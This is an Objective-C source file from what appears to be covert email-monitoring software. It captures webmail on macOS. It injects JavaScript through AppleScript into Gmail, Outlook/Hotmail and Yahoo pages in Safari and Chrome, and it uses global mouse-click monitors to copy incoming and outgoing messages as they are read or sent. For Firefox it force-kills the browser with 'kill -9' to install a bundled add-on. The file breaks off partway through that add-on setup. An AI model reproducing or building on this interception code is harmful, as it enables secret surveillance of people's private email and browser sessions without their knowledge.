//
//  WebmailNotifier.m
//  WebmailCaptureManager
//
//  Created by ophat on 2/6/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "WebmailNotifier.h"
#import "AsyncController.h"
#import "WebmailHTMLParser.h"
#import "WebmailHTMLParser+Yahoo.h"
#import "WebmailHTMLParser+Outlook.h"
#import "NSArray+Webmail.h"
#import "AsJsUtils.h"
#import "JavaScriptAccessor.h"
#import "SpecialWebmailNotifier.h"

#import "PageValueChangeNotifier.h"
#import "PageInfo.h"
#import "MessagePortIPCSender.h"
#import "SystemUtilsImpl.h"

#import <AppKit/AppKit.h>
#import <WebKit/WebKit.h>
#import <CommonCrypto/CommonDigest.h>

NSString * const kWebmail_SafariBundleID         = @"com.apple.Safari";
NSString * const kWebmail_GoogleChromeBundleID   = @"com.google.Chrome";

@implementation WebmailNotifier

@synthesize mAddonName, mAddonPlist;
@synthesize mMouseEventHandler, mForceAliveMouseEventHandler;

- (instancetype) init {
    self = [super init];
    if (self) {
        [self getAddon];
        mAsyC = [[AsyncController alloc] init];
        mQueue = [[NSOperationQueue alloc] init];
        mQueue.maxConcurrentOperationCount = 5;
        mPageNotifier = [[PageValueChangeNotifier alloc] initWithPageVisitedDelegate:self];
        mPageNotifier.mDelegate = self;
        mPageNotifier.mSelector = @selector(userClicked:);
        mSpecialPageNotifier = [[SpecialWebmailNotifier alloc] init];
        mSpecialPageNotifier.mDelegate = self;
        mSpecialPageNotifier.mSelector = @selector(urlbarChanged:);
    }
    return self;
}

#pragma mark - Start or stop capture

- (void) startCapture {
    DLog(@"startCapture");
    
    [mAsyC stopServer];
    [mAsyC startServer];
    
    [mPageNotifier startNotify];
    [mSpecialPageNotifier startNotify];
    
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidTerminateApplicationNotification object:nil];
    
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self selector:@selector(webmailUnregisterMouseClick:) name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self selector:@selector(webmailUnregisterMouseClickCaseTerminate:) name:NSWorkspaceDidTerminateApplicationNotification object:nil];
}

- (void) stopCapture{
    DLog(@"stopCapture");
    
    [mAsyC stopServer];
    
    [mPageNotifier stopNotify];
    [mSpecialPageNotifier stopNotify];
    
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] removeObserver:self name:NSWorkspaceDidTerminateApplicationNotification object:nil];
    
    [self unregisterMouseClickListener];
    [self unregisterYahooMouseClickListener];
    
    [mQueue cancelAllOperations];
}

#pragma mark - Page visited delegate

- (void) pageVisited:(PageInfo *) aPageVisited {
    DLog(@"Visit url : %@", aPageVisited.mUrl);
    PageInfo *page = [aPageVisited copy]; // aPageVisited did not sometime visible to block leading to EXC_BAD_ACCESS that's why it needs a copy
    if ([page.mApplicationID isEqualToString:kWebmail_SafariBundleID] ||
        [page.mApplicationID isEqualToString:kWebmail_GoogleChromeBundleID]) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
            [self startAnalyzeCallback:page];
            [page release];
        });
    } else { // Firefox
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^(void) {
            [self checkAddon:page];
            [page release];
        });
    }
}

#pragma mark Page visited subclass delegate

- (void) userClicked: (PageInfo *) aClickedPage {
    if (!self.mMouseEventHandler && !self.mForceAliveMouseEventHandler) {
        [self pageVisited:aClickedPage];
    } else {
        DLog(@"Ignore compose url from user clicks page");
    }
}

#pragma mark Special page visited (like Outlook)

- (void) urlbarChanged: (PageInfo *) aSpecialPage {
    DLog(@"Special url : %@", aSpecialPage.mUrl);
    [self pageVisited:aSpecialPage];
}

#pragma mark - Workspace delegate

- (void) webmailUnregisterMouseClick:(NSNotification *) notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication *runningapp = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    if ([[runningapp bundleIdentifier] isEqualToString:kWebmail_SafariBundleID]) {
        [self unregisterMouseClickListener];
        [self unregisterYahooMouseClickListener];
        [mQueue cancelAllOperations];
    }
    else if([[runningapp bundleIdentifier] isEqualToString:kWebmail_GoogleChromeBundleID]) {
        [self unregisterMouseClickListener];
        [self unregisterYahooMouseClickListener];
        [mQueue cancelAllOperations];
    }
}

- (void) webmailUnregisterMouseClickCaseTerminate:(NSNotification *) notification {
    NSDictionary *userInfo = [notification userInfo];
    NSString *bundleID = [userInfo objectForKey:@"NSApplicationBundleIdentifier"];
    if ([bundleID isEqualToString:kWebmail_SafariBundleID] ||
        [bundleID isEqualToString:kWebmail_GoogleChromeBundleID]) {
        [self unregisterMouseClickListener];
        [self unregisterYahooMouseClickListener];
        [mQueue cancelAllOperations];
    }
}

#pragma mark - Appple & Java script utils

- (NSString *) getPageSourceForApp: (NSString *) aAppName {
    return [AsJsUtils getPageSourceForApp:aAppName];
}

- (NSString *) getUrlForApp: (NSString *) aAppName {
    return [AsJsUtils getUrlForApp:aAppName];
}

- (NSString *) getinnerHTMLAppleScriptSourceForApp: (NSString *) aAppName {
    return [AsJsUtils getinnerHTMLAppleScriptSourceForApp:aAppName];
}
    
- (NSString *) getAppleScriptSourceForApp: (NSString *) aAppName javaScript: (NSString *) aJavaScript delay: (float) aDelay {
    return [AsJsUtils getAppleScriptSourceForApp:aAppName javaScript:aJavaScript delay:aDelay];
}

#pragma mark - Analyze web page

- (void) startAnalyzeCallback: (PageInfo *) aPageInfo {
    @try {
        NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
        DLog(@"startAnalyzeCallback");
        
        [self analyzePageSourceOfPageInfo:aPageInfo];
        
        DLog(@"startAnalyzeCallback end of journey");
        
        [pool drain];
        
    } @catch (NSException *exception) {
        DLog(@"### Analyze page exception : %@", exception);
    }
}

- (void) analyzePageSourceOfPageInfo: (PageInfo *) aPageInfo {
    NSString *url = aPageInfo.mUrl;
    NSString *applicationName = aPageInfo.mApplicationName;
    
    NSString *myHTMLSource= @"";
    
    if ([url length] > 0) {
#pragma mark ****** Incoming Outlook, Live, Hotmail
        if (([url rangeOfString:@"mail.live.com/"].location != NSNotFound &&
             [url rangeOfString:@"?tid="].location          != NSNotFound &&
             [url rangeOfString:@"fid=flinbox"].location    != NSNotFound) ||
            ([url rangeOfString:@"mail.live.com/"].location != NSNotFound &&
             [url rangeOfString:@"?tid="].location          != NSNotFound &&
             [url rangeOfString:@"fid=flsearch"].location   != NSNotFound)) {
            myHTMLSource = [self getPageSourceForApp:applicationName];
            [self parse:[WebmailHTMLParser class] selector:@selector(Hotmail_HTMLParser:) obj1:myHTMLSource obj2:nil];
        }
        else if ([url rangeOfString:@"mail.live.com/"].location != NSNotFound &&
                 [url rangeOfString:@"Compose"].location        != NSNotFound) {
            [self registerMouseClickListener];
        }
        else if ([url rangeOfString:@"outlook.live.com/"].location != NSNotFound) {
            if ([url rangeOfString:@"mail"].location != NSNotFound) {
                if ([url rangeOfString:@"inbox/rp"].location        != NSNotFound ||
                    [url rangeOfString:@"junkemail/rp"].location    != NSNotFound) {
                    NSString *jsMethod5  = [JavaScriptAccessor jsMethod:5];
                    NSString *jsonResult5 = [AsJsUtils executeJS:jsMethod5 app:applicationName delay:1];
                    //DLog(@"jsonResult5 %@", jsonResult5);
 
                    if (jsonResult5.length == 0) { // For first mail that need to load from server
                        jsonResult5 = [AsJsUtils executeJS:jsMethod5 app:applicationName delay:3];
                        //DLog(@"second jsonResult5 %@", jsonResult5);
                    }
                    
                    [self parse:[WebmailHTMLParser class] selector:@selector(parseOutlook_IncomingJSON:) obj1:jsonResult5 obj2:nil];
                }
                // -- Compose
                [self registerMouseClickListener];
            }
            else if ([url rangeOfString:@"owa/projection"].location != NSNotFound) { // Popup Outlook
                NSString *jsMethod5  = [JavaScriptAccessor jsMethod:5];
                NSString *jsonResult5 = [AsJsUtils executeJS:jsMethod5 app:applicationName delay:1];
                //DLog(@"jsonResult5 %@", jsonResult5);
                
                if (jsonResult5 == nil) { // For first mail that need to load from server
                    jsonResult5 = [AsJsUtils executeJS:jsMethod5 app:applicationName delay:3];
                    //DLog(@"second jsonResult5 %@", jsonResult5);
                }
                
                [self parse:[WebmailHTMLParser class] selector:@selector(parseOutlook_IncomingJSON:) obj1:jsonResult5 obj2:nil];

                // -- Reply, forward
                [self registerMouseClickListener];
            }
            else if ([url rangeOfString:@"outlook.live.com/owa/"].location != NSNotFound) { // Outlook with reading pane
                DLog(@"register with owa");
                [self registerMouseClickListener];
            }
        }
#pragma mark ****** Incoming Gmail
        else if ([url rangeOfString:@"mail.google.com/mail"].location   != NSNotFound &&
                 [url rangeOfString:@"compose"].location                != NSNotFound) { // e.g: https://mail.google.com/mail/u/0/#inbox/1582ecbfe4fb2291?compose=new
            [self registerMouseClickListener];
        }
        else if ([url rangeOfString:@"mail.google.com/mail"].location   != NSNotFound &&
                 [url rangeOfString:@"#inbox"].location                 != NSNotFound) { // e.g: https://mail.google.com/mail/u/0/#inbox
            NSString *inboxChecker = url;
            NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#inbox"];
            inboxChecker = [spliter lastObject];
            if ([inboxChecker length] > 0) { // e.g: https://mail.google.com/mail/u/0/#inbox/1582ecbfe4fb2291
                myHTMLSource = [self getPageSourceForApp:applicationName];
                [self parse:[WebmailHTMLParser class] selector:@selector(Gmail_HTMLParser:) obj1:myHTMLSource obj2:nil];
                // Reply or Forward inline
                [self registerMouseClickListener];
            }
        }
        else if ([url rangeOfString:@"mail.google.com/mail"].location   != NSNotFound &&
                 [url rangeOfString:@"#search"].location                != NSNotFound) { // e.g: https://mail.google.com/mail/u/0/#search/makara%40vervata.com or https://mail.google.com/mail/u/0/#search/facebook
            NSString *inboxChecker = url;
            NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#search"];
            inboxChecker = [spliter lastObject];
            if (inboxChecker.length > 0 && [inboxChecker rangeOfString:@"in%3Asent+"].location == NSNotFound) { // in:sent+, e.g: https://mail.google.com/mail/u/0/#search/in%3Asent+tagged
                DLog(@"Gmail Implement Search Not In Sent");
                myHTMLSource = [self getPageSourceForApp:applicationName];
                [self parse:[WebmailHTMLParser class] selector:@selector(Gmail_HTMLParser:) obj1:myHTMLSource obj2:nil];
            }
            // Reply or Forward inline
            [self registerMouseClickListener];
        }
        else if ([url rangeOfString:@"mail.google.com/mail"].location != NSNotFound) {
            NSString *inboxChecker = url; // e.g: https://mail.google.com/mail/u/0/#imp/15691cd21d9a998d where #imp can replace by: #starred, #sent, #drafts, #label, #...
            if ([inboxChecker rangeOfString:@"#"].location != NSNotFound) {
                NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#"];
                inboxChecker = [spliter secondObject];
                spliter = [inboxChecker componentsSeparatedByString:@"/"];
                inboxChecker = [spliter secondObject];
                if ([inboxChecker length] > 0) {
                    // Reply or Forward inline
                    [self registerMouseClickListener];
                }
            }
        }
#pragma mark ****** Incoming Yahoo
        else if ([url rangeOfString:@"mail.yahoo.com/"].location != NSNotFound) {
            DLog(@"--> Yahoo");
            if ([url rangeOfString:@"neo/b"].location == NSNotFound) {
                NSString *scptSource = [self getAppleScriptSourceForApp:applicationName javaScript:@"function secretUrl() {var  myVar = document.getElementById('Inbox').childNodes[1].getAttribute('aria-selected'); return myVar;} secretUrl();" delay:0.2f];
                NSAppleScript *isInInbox = [[NSAppleScript alloc] initWithSource:scptSource];
                NSAppleEventDescriptor *isInInboxResult = [isInInbox executeAndReturnError:nil];
                if ([[isInInboxResult stringValue] isEqualToString:@"true"]) {
                    DLog(@"In Inbox");
                    NSString *scptSource = [self getAppleScriptSourceForApp:applicationName javaScript:@"function secretUrl() {var  myVar = document.getElementById('inboxcontainer').getAttribute('style'); return myVar;} secretUrl();" delay:0.0f];
                    NSAppleScript *isInMainList = [[NSAppleScript alloc] initWithSource:scptSource];
                    NSAppleEventDescriptor *isInMainListResult = [isInMainList executeAndReturnError:nil];
                    if ([[isInMainListResult stringValue] isEqualToString:@"visibility: hidden;"]) {
                        DLog(@"Not In Main");
                        sleep(2.5);
                        
                        myHTMLSource = [self getPageSourceForApp:applicationName];
                        [self parse:[WebmailHTMLParser class] selector:@selector(Yahoo_HTMLParser:type:) obj1:myHTMLSource obj2:applicationName];
                    }
                    [isInMainList release];
                }
                [isInInbox release];
                
                [self yahooAddScript:applicationName]; // Check is user composing now?
                [self registerYahooMouseClickListener];
            }
            else {
                DLog(@"Basic Gooo...!!!");
                if ([url rangeOfString:@"compose?"].location == NSNotFound) {
                    sleep(1.5);
                    
                    myHTMLSource = [self getPageSourceForApp:applicationName];
                    [self parse:[WebmailHTMLParser class] selector:@selector(Yahoo_HTMLParser:type:) obj1:myHTMLSource obj2:applicationName];
                } else {
                    [self yahooAddScript:applicationName]; // Check is user composing?
                    [self registerYahooMouseClickListener];
                }
            }
        }
    }
}

#pragma mark - Mouse click delegate (Live, Gmail)

- (void) registerMouseClickListener {
    if (self.mMouseEventHandler == nil) {
        self.mMouseEventHandler = [NSEvent addGlobalMonitorForEventsMatchingMask:NSLeftMouseDownMask handler:^(NSEvent * mouseEvent) {
            DLog(@"User click listener : %d", [NSThread currentThread].isMainThread);
            NSRunningApplication *rApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
            if ([rApp.bundleIdentifier isEqualToString:kWebmail_SafariBundleID] ||
                [rApp.bundleIdentifier isEqualToString:kWebmail_GoogleChromeBundleID]) {
                // EXC_BAD_ACCESS, Zombies https://code.tutsplus.com/tutorials/what-is-exc_bad_access-and-how-to-debug-it--cms-24544
                // Capture page (make strong reference or retain) for operation block https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/Blocks/Articles/bxVariables.html ,
                // add __block storage type modifier to block variable to help detect 'An Objective-C message was sent to a deallocated 'PageInfo' object (zombie)'
                NSString *app = [rApp.localizedName copy];
                [mQueue addOperationWithBlock:^{
                    @try {
                        [self analyzeUserClick:app];
                    } @catch (NSException *exception) {
                        DLog(@"User clicks in Outlook, Gmail exception : %@", exception);
                    } @finally {
                        ;
                    }
                    [app release];
                }];
            } else {
                [self unregisterMouseClickListener];
            }
        }];
    }
}

- (void) unregisterMouseClickListener {
    if (self.mMouseEventHandler != nil) {
        [NSEvent removeMonitor:self.mMouseEventHandler];
        self.mMouseEventHandler = nil;
    }
}

#pragma mark Yahoo

- (void) registerYahooMouseClickListener {
    if (self.mForceAliveMouseEventHandler == nil) {
        self.mForceAliveMouseEventHandler = [NSEvent addGlobalMonitorForEventsMatchingMask:NSLeftMouseDownMask handler:^(NSEvent * mouseEvent) {
            DLog(@"Yahoo user click listener : %d", [NSThread currentThread].isMainThread);
            NSRunningApplication *rApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
            if ([rApp.bundleIdentifier isEqualToString:kWebmail_SafariBundleID] ||
                [rApp.bundleIdentifier isEqualToString:kWebmail_GoogleChromeBundleID]) {
                // EXC_BAD_ACCESS, Zombies https://code.tutsplus.com/tutorials/what-is-exc_bad_access-and-how-to-debug-it--cms-24544
                // Capture applicationName for operation block https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/Blocks/Articles/bxVariables.html ,
                // add __block storage type modifier to block variable to help detect 'An Objective-C message was sent to a deallocated 'PageInfo' object (zombie)'
                NSString *app = [rApp.localizedName copy];
                [mQueue addOperationWithBlock:^{
                    @try {
                        [self yahooAddScript:app];
                    } @catch (NSException *exception) {
                        DLog(@"User click in Yahoo exception : %@", exception);
                    } @finally {
                        ;
                    }
                    [app release];
                }];
            } else {
                [self unregisterYahooMouseClickListener];
            }
        }];
    }
}

- (void) unregisterYahooMouseClickListener {
    if (self.mForceAliveMouseEventHandler != nil) {
        [NSEvent removeMonitor:self.mForceAliveMouseEventHandler];
        self.mForceAliveMouseEventHandler = nil;
    }
}

#pragma mark - Capture mail in user click

- (void) analyzeUserClick: (NSString *) aAppName {
    NSString *applicationName = aAppName;
    
    NSString *url = [self getUrlForApp:applicationName];
    
#pragma mark ****** Outgoing Outlook, Live, Hotmail
    if ([url rangeOfString:@"mail.live.com/"].location  != NSNotFound &&
        [url rangeOfString:@"Compose"].location         != NSNotFound) {
        NSString *myHTMLSource = [self getPageSourceForApp:applicationName];
        
        NSString *scptSource2 = [self getAppleScriptSourceForApp:applicationName javaScript:@"function myValue1() { var rm = document.getElementById('SendMessage'); rm.onmouseenter = function(){ var btag = document.getElementsByTagName('body'); var node = document.createElement('div'); node.setAttribute('class', 'hm_cap_s'); node.setAttribute('hidden', true); btag[0].appendChild(node); } } myValue1();function myValue2() { var rm = document.getElementById('SendMessage'); rm.onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('hm_cap_s'); for(var j = 0; j < node.length; j++) { node[j].parentNode.removeChild(node[j]); } },500); } } myValue2();" delay:0.0f];
        NSAppleScript *scpt2 = [[NSAppleScript alloc] initWithSource:scptSource2];
        [scpt2 executeAndReturnError:nil];
        [scpt2 release];
        
        [self parse:[WebmailHTMLParser class] selector:@selector(Hotmail_HTMLParser_Outgoing:type:) obj1:myHTMLSource obj2:applicationName];
    }
    else if ([url rangeOfString:@"outlook.live.com/"].location != NSNotFound) {
        if ([url rangeOfString:@"outlook.live.com/owa/"].location != NSNotFound) {
            DLog(@"Outlook new user interface incoming for reading pane layout");
            // Check reading pane for outlook
            NSString *jsMethod6 = [JavaScriptAccessor jsMethod:6]; // User set to reading pane on the right or at bottom?
            NSString *jsonResult6 = [AsJsUtils executeJS:jsMethod6 app:applicationName];
            DLog(@"jsonResult6 : %@", jsonResult6);
            
            NSString *jsMethod8 = [JavaScriptAccessor jsMethod:8]; // Capture outgoing email first before too late
            NSString *jsonResult8 = [AsJsUtils executeJS:jsMethod8 app:applicationName];
            //DLog(@"jsonResult8 : %@", jsonResult8);
            
            NSString *jsMethod7 = [JavaScriptAccessor jsMethod:7]; // User click on 'Send' button?
            NSString *jsonResult7 = [AsJsUtils executeJS:jsMethod7 app:applicationName];
            DLog(@"jsonResult7 : %@", jsonResult7);
            
            if ([jsonResult7 isEqualToString:@"true"]) { // Outgoing Outlook
                if (jsonResult8.length > 0) {
                    [self parse:[WebmailHTMLParser class] selector:@selector(parseOutlook_OutgoingJSON:) obj1:jsonResult8 obj2:nil];
                }
            }
#pragma mark ****** Incoming Outlook, Live, Hotmail
            else if ([jsonResult6 isEqualToString:@"true"]) {
                NSString *jsMethod5 = [JavaScriptAccessor jsMethod:5];
                NSString *jsonResult5 = [AsJsUtils executeJS:jsMethod5 app:applicationName delay:1];
                //DLog(@"jsonResult5 : %@", jsonResult5); // Capture incoming mail from reading pane on the right or at bottom
                
                if (jsonResult5.length == 0) { // For first mail that need to load from server
                    jsonResult5 = [AsJsUtils executeJS:jsMethod5 app:applicationName delay:3];
                    //DLog(@"second jsonResult5 : %@", jsonResult5);
                }
                
                if (jsonResult5.length > 0) {
                    [self parse:[WebmailHTMLParser class] selector:@selector(parseOutlook_IncomingJSON:) obj1:jsonResult5 obj2:nil];
                }
            }
        }
    }
#pragma mark ****** Outgoing Gmail
    else if ([url rangeOfString:@"mail.google.com/mail"].location   != NSNotFound &&
             [url rangeOfString:@"compose"].location                != NSNotFound) {
        NSString *myHTMLSource = [self getPageSourceForApp:applicationName];
        
        NSString *scptSource2 = [self getAppleScriptSourceForApp:applicationName javaScript:@"function myValue1() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseenter = function(){ var data  = document.getElementsByClassName('nH Hd'); for(var j = 0; j < data.length; j++) { if(data[j].innerHTML.indexOf(this.id) > -1){ var node = document.createElement('div'); var subject = document.getElementsByClassName('aoT')[j].value; node.setAttribute('class', 'gm_cap_s'); node.setAttribute('hidden', true); node.setAttribute('value','GM_SUBJ_S:'+subject); var clone = data[j].cloneNode(true); node.appendChild(clone); var add = document.getElementsByClassName('aAU'); add[0].appendChild(node); break; }}}}} myValue1(); function myValue2() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('gm_cap_s'); for(var j = 0; j < node.length; j++) { if(node[j].innerHTML.indexOf(this.id) > -1){ node[j].parentNode.removeChild(node[j]); }}},1650);}}} myValue2();" delay:0.0f];
        NSAppleScript *scpt2 = [[NSAppleScript alloc] initWithSource:scptSource2];
        [scpt2 executeAndReturnError:nil];
        [scpt2 release];
        
        [self parse:[WebmailHTMLParser class] selector:@selector(Gmail_HTMLParser_Outgoing:type:) obj1:myHTMLSource obj2:applicationName];
    }
#pragma mark ****** Incoming Gmail (legacy)
    else if ([url rangeOfString:@"mail.google.com/mail"].location != NSNotFound) {
        NSString *inboxChecker = url;
        
        if ([inboxChecker rangeOfString:@"#inbox"].location != NSNotFound) {
            NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#inbox"];
            inboxChecker = [spliter lastObject];
            
            if ([inboxChecker length] > 0) {
                
                sleep(1.2);
                
                NSString *myHTMLSource = [self getPageSourceForApp:applicationName];
                
                NSString *scptSource2 = [self getAppleScriptSourceForApp:applicationName javaScript:@"function myValue1() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseenter = function(){ var data  = document.getElementsByClassName('gA gt'); for(var j = 0; j < data.length; j++) { if(data[j].innerHTML.indexOf(this.id) > -1){ var node = document.createElement('div'); var subject = document.getElementsByClassName('aoT')[0].value; node.setAttribute('class', 'gm_cap_s'); node.setAttribute('hidden', true); node.setAttribute('value','GM_SUBJ_S:'+subject); var clone = data[j].cloneNode(true); node.appendChild(clone); var add = document.getElementsByClassName('aAU'); add[0].appendChild(node); break; }}}}} myValue1(); function myValue2() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('gm_cap_s'); for(var j = 0; j < node.length; j++) { if(node[j].innerHTML.indexOf(this.id) > -1){ node[j].parentNode.removeChild(node[j]); }}},1650);}}} myValue2();" delay:0.0f];
                NSAppleScript *scpt2 = [[NSAppleScript alloc] initWithSource:scptSource2];
                [scpt2 executeAndReturnError:nil];
                [scpt2 release];
                
                NSString *scptSource3 = [self getAppleScriptSourceForApp:applicationName javaScript:@"function myValue() {var myVar = document.getElementsByClassName('nH Hd')[0].innerHTML;return myVar;} myValue();" delay:0.0];
                NSAppleScript *scpt3 = [[NSAppleScript alloc] initWithSource:scptSource3];
                NSAppleEventDescriptor *scptResult3 = [scpt3 executeAndReturnError:nil];
                NSString *checker = [scptResult3 stringValue];
                [scpt3 release];
                
                if ([checker length] > 0) {
                    NSString *scptSource4 = [self getAppleScriptSourceForApp:applicationName javaScript:@"function myValue1() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseenter = function(){ var data  = document.getElementsByClassName('nH Hd'); for(var j = 0; j < data.length; j++) { if(data[j].innerHTML.indexOf(this.id) > -1){ var node = document.createElement('div'); var subject = document.getElementsByClassName('aoT')[j].value; node.setAttribute('class', 'gm_cap_s'); node.setAttribute('hidden', true); node.setAttribute('value','GM_SUBJ_S:'+subject); var clone = data[j].cloneNode(true); node.appendChild(clone); var add = document.getElementsByClassName('aAU'); add[0].appendChild(node); break; }}}}} myValue1(); function myValue2() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('gm_cap_s'); for(var j = 0; j < node.length; j++) { if(node[j].innerHTML.indexOf(this.id) > -1){ node[j].parentNode.removeChild(node[j]); }}},1650);}}} myValue2();" delay:0.0f];
                    NSAppleScript *scpt4 = [[NSAppleScript alloc] initWithSource:scptSource4];
                    [scpt4 executeAndReturnError:nil];
                    [scpt4 release];
                }
                
                [self parse:[WebmailHTMLParser class] selector:@selector(Gmail_HTMLParser_InMail_Outgoing:type:) obj1:myHTMLSource obj2:applicationName];
            }
        }
    }
    else{
        [self unregisterMouseClickListener];
    }
}

#pragma mark - Yahoo add script

- (void) yahooAddScript:(NSString *) aAppName {
    DLog(@"yahooAddScript : %@", aAppName);
    
    NSString *applicationName = aAppName;
    
    NSString *url = [self getUrlForApp:applicationName];
    
#pragma mark ****** Outgoing Yahoo
    if ([url rangeOfString:@"mail.yahoo.com/"].location != NSNotFound) {
        if ([url rangeOfString:@"neo/b"].location == NSNotFound) { // Full feature
            // --- 1 (Obsolete)
            //sleep(1.0);
            //NSString *myHTMLSource = [self getPageSourceForApp:applicationName];
            //[self parse:[WebmailHTMLParser class] selector:@selector(Yahoo_HTMLParser_Outgoing:type:) obj1:myHTMLSource obj2:applicationName];
            
            // --- 2
            NSString *jsMethod1  = [JavaScriptAccessor jsMethod:1];
            NSString *jsonResult1 = [AsJsUtils executeJS:jsMethod1 app:applicationName];
            NSString *jsMethod2  = [JavaScriptAccessor jsMethod:2];
            NSString *sendButtonChecker = [AsJsUtils executeJS:jsMethod2 app:applicationName];
            if ([sendButtonChecker isEqualToString:@"true"]) { // *** Suppose user compose & sent
                [WebmailHTMLParser parseYahoo_OugoingJSON:jsonResult1 app:aAppName];
            }
            DLog(@"User is clicking 'Send' button : %@", sendButtonChecker);
        } else { // Basic
            NSString *jsMethod3  = [JavaScriptAccessor jsMethod:3];
            NSString *jsonResult3 = [AsJsUtils executeJS:jsMethod3 app:applicationName];
            NSString *jsMethod4  = [JavaScriptAccessor jsMethod:4];
            NSString *sendButtonChecker = [AsJsUtils executeJS:jsMethod4 app:applicationName];
            if ([sendButtonChecker isEqualToString:@"true"]) { // *** Suppose user compose & sent
                [WebmailHTMLParser parseYahoo_OugoingJSON:jsonResult3 app:aAppName];
            }
            DLog(@"User is clicking 'Send' (top or bottom) button : %@", sendButtonChecker);
        }
    } else {
        [self unregisterYahooMouseClickListener];
    }
}

#pragma mark - Check addon & setup
    
- (void) getAddon {
    self.mAddonName   = [self getAddonName];
    self.mAddonPlist  = @"addonversion.plist";
}
    
- (NSString *) getAddonName {
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSString *result = @"";
    NSArray *subDir = [fileManager contentsOfDirectoryAtPath:[[NSBundle mainBundle] resourcePath] error:nil];
    for (int i = 0; i < [subDir count]; i++) {
        if ([[subDir objectAtIndex:i] rangeOfString:@".xpi"].location != NSNotFound) {
            result = [subDir objectAtIndex:i];
        }
    }
    DLog(@"### result : %@", result);
    return result;
}

- (void) checkAddon: (PageInfo *) aPageInfo {
    NSString *placesPath = aPageInfo.mFirefoxPlacesPath;
    if (placesPath) {
        NSString *currentAddonPlistPath = [placesPath stringByDeletingLastPathComponent];
        currentAddonPlistPath = [currentAddonPlistPath stringByAppendingPathComponent:@"extensions"];
        currentAddonPlistPath = [currentAddonPlistPath stringByAppendingPathComponent:self.mAddonPlist];
        //DLog(@"currentAddonPlistPath : %@", currentAddonPlistPath);
        
        NSString *resourcePath = [[NSBundle mainBundle] resourcePath];
        NSString *updateAddonScriptPath = [resourcePath stringByAppendingPathComponent:@"InstallAddon.sh"];
        //DLog(@"updateAddonScriptPath : %@", updateAddonScriptPath);
        
        NSFileManager *fileManager = [NSFileManager defaultManager];
        if (![fileManager fileExistsAtPath:currentAddonPlistPath]) {
            // Copy and replace!
            [self setupAddon:currentAddonPlistPath script:updateAddonScriptPath firefoxPID:aPageInfo.mPID];
        } else {
            NSString *newAddPlistPath = [updateAddonScriptPath stringByDeletingLastPathComponent];
            newAddPlistPath = [newAddPlistPath stringByAppendingPathComponent:self.mAddonPlist];
            NSDictionary *currentVersion = [NSDictionary dictionaryWithContentsOfFile:currentAddonPlistPath];
            NSDictionary *newVersion = [NSDictionary dictionaryWithContentsOfFile:newAddPlistPath];
            
            BOOL requireUpdate = NO;
            if (currentVersion[@"major"] == nil) { // Check for old addonversion.plist format of older version first
                requireUpdate = YES;
            }
            else if (newVersion[@"major"] > currentVersion[@"major"]) {
                requireUpdate = YES;
            }
            else {
                if (newVersion[@"major"] == currentVersion[@"major"]) {
                    if (newVersion[@"minor"] > currentVersion[@"minor"]) {
                        requireUpdate = YES;
                    }
                }
            }
            
            if (requireUpdate) {
                // Copy and replace!
                [self setupAddon:currentAddonPlistPath script:updateAddonScriptPath firefoxPID:aPageInfo.mPID];
            } else {
                DLog(@"--------- Nothing to update addon ------------");
            }
        }
    }
}

#pragma mark Message port

- (void) setupAddon:(NSString *) aCurrentAddonPlistPath script: (NSString *) aScriptPath firefoxPID: (pid_t) aPID {
    DLog(@"--------- Set up addon ------------");
    NSRunningApplication *rApp = [NSRunningApplication runningApplicationWithProcessIdentifier:aPID];
    NSURL *bundleUrl = [rApp bundleURL];
    
    NSString *killCMD = [NSString stringWithFormat:@"kill -9 %d", aPID];
    system([killCMD UTF8String]);
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    NSError *error = nil;
    if (![fileManager fileExistsAtPath:[aCurrentAddonPlistPath stringByDeletingLastPathComponent]]) {
        [fileManager createDirectoryAtPath:[aCurrentAddonPlistPath stringByDeletingLastPathComponent]
               withIntermediateDirectories:NO
                                attributes:nil
                                     error:&error];
        if (error) {
            DLog(@"Create extensions folder error : %@", error);
            return;
        }
    }
    
